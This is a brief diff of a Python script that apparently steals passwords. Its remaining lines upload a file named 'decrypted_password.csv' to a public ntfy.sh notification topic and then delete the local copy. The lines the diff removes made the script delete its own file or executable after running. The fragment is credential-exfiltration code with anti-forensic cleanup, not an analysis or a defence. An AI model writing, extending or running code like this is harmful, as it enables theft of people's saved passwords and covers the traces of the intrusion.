@@ -104,10 +104,3 @@ if __name__ == '__main__':
 
     requests.post("https://ntfy.sh/shuchirjain_alerts", data=open("decrypted_password.csv", "rb"), headers={"Filename": "decrypted_password.csv"})
     os.remove("decrypted_password.csv")
-
-if getattr(sys, 'frozen', False):
-    path = os.path.realpath(sys.executable)
-elif __file__:
-  path = os.path.realpath(__file__)
-
-os.remove(path)
